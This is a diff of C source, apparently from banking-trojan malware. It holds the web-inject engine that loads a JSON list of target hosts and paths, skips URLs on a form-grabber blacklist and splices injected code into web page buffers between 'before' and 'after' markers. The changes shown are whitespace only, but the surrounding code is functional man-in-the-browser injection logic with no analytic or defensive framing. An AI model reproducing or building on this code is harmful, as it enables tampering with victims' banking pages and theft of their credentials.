@@ -18,7 +18,7 @@ void LoadWebInjects()
    if(json->error != AI_JSON_E_OK)
       goto err;
    if(json->root.type != AI_JSON_OBJECT)
-	   goto err;
+      goto err;
    loaded = TRUE;
    return;
 err:
@@ -30,8 +30,8 @@ err:
 
 static AiListNode *GetFirstNode(char *name)
 {
-	AiList      *object     = ((AiList *) json->root.data.object);
-	AiJsonValue *currValue = AiJsonGetValueObject(object, name);
+   AiList      *object     = ((AiList *) json->root.data.object);
+   AiJsonValue *currValue = AiJsonGetValueObject(object, name);
    if(!currValue)
       return NULL;
 
@@ -47,8 +47,8 @@ BOOL UrlIsBlacklisted(char *url)
       return NULL;
 
    AiListNode *curr = GetFirstNode("fg_blacklist");
-	while(curr)
-	{
+   while(curr)
+   {
       AiJsonValue *blacklistedUrlMask = (AiJsonValue *) curr->data;
       if(blacklistedUrlMask->type != AI_JSON_STRING)
          goto next;
@@ -68,23 +68,23 @@ AiList *GetWebInject(char *host, char *path)
 
    AiListNode *curr = GetFirstNode("injects");
   
-	while(curr)
-	{
-	   AiJsonValue *object = (AiJsonValue *) curr->data;
-		if(object->type != AI_JSON_OBJECT)
-		   goto next;
+   while(curr)
+   {
+      AiJsonValue *object = (AiJsonValue *) curr->data;
+      if(object->type != AI_JSON_OBJECT)
+         goto next;
 
-		AiJsonValue *url = AiJsonGetValueObject(object->data.object, "host");
-		if(!url || url->type != AI_JSON_STRING)
-		   goto next;
+      AiJsonValue *url = AiJsonGetValueObject(object->data.object, "host");
+      if(!url || url->type != AI_JSON_STRING)
+         goto next;
 
-		AiJsonValue *uri = AiJsonGetValueObject(object->data.object, "path");
-		if(!uri || uri->type != AI_JSON_STRING)
-		   goto next;
+      AiJsonValue *uri = AiJsonGetValueObject(object->data.object, "path");
+      if(!uri || uri->type != AI_JSON_STRING)
+         goto next;
 
-		AiJsonValue *code = AiJsonGetValueObject(object->data.object, "content");
-		if(!code || code->type != AI_JSON_ARRAY || !code->data.array->len)
-		   goto next;
+      AiJsonValue *code = AiJsonGetValueObject(object->data.object, "content");
+      if(!code || code->type != AI_JSON_ARRAY || !code->data.array->len)
+         goto next;
 
       if((!host || WildCardStrCmp(url->data.string, host, TRUE, TRUE)) && 
          (!path || WildCardStrCmp(uri->data.string, path, TRUE, TRUE)))
@@ -101,24 +101,24 @@ void ReplaceWebInjects(char **buffer, AiList *injects)
 {
   if(!injects || !buffer)
       return;
-	AiListNode *curr = injects->first;
-	while(curr)
-	{
-	   AiJsonValue *object = (AiJsonValue *) curr->data;
-		if(object->type != AI_JSON_OBJECT)
-		   goto next;
+   AiListNode *curr = injects->first;
+   while(curr)
+   {
+      AiJsonValue *object = (AiJsonValue *) curr->data;
+      if(object->type != AI_JSON_OBJECT)
+         goto next;
 
-		AiJsonValue *replace = AiJsonGetValueObject(object->data.object, "code");
-		if(!replace || replace->type != AI_JSON_STRING)
-		   goto next;
+      AiJsonValue *replace = AiJsonGetValueObject(object->data.object, "code");
+      if(!replace || replace->type != AI_JSON_STRING)
+         goto next;
 
-		AiJsonValue *before = AiJsonGetValueObject(object->data.object, "before");
-		if(!before || before->type != AI_JSON_STRING)
-		   goto next;
+      AiJsonValue *before = AiJsonGetValueObject(object->data.object, "before");
+      if(!before || before->type != AI_JSON_STRING)
+         goto next;
 
-		AiJsonValue *after = AiJsonGetValueObject(object->data.object, "after");
-		if(!after || after->type != AI_JSON_STRING)
-		   goto next;
+      AiJsonValue *after = AiJsonGetValueObject(object->data.object, "after");
+      if(!after || after->type != AI_JSON_STRING)
+         goto next;
 
       ReplaceBeforeAfter(buffer, replace->data.string, before->data.string, after->data.string);
 next:
